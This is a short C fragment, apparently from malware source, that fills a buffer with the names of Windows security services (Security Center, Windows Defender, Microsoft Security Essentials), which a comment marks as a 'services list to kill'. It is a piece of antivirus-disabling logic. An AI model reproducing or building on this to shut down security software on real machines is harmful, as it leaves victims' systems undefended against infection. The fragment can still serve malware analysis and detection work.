
 char AVSVC[512]; // services list to kill (also used by ProcessInactiveServices)

 void InitAVSVC()
 {
  // Windows Security Center
  // Windows Defender
  // Microsoft Security Essentials (Microsoft Antimalware Service)
  // Microsoft Security Essentials (Microsoft Network Inspection)
  strcpy(AVSVC,"|wscsvc|WinDefend|MsMpSvc|NisSrv|"); 

  #ifdef dbgdbg
   adddeb("InitAVSVC: %s",AVSVC);
  #endif
 }

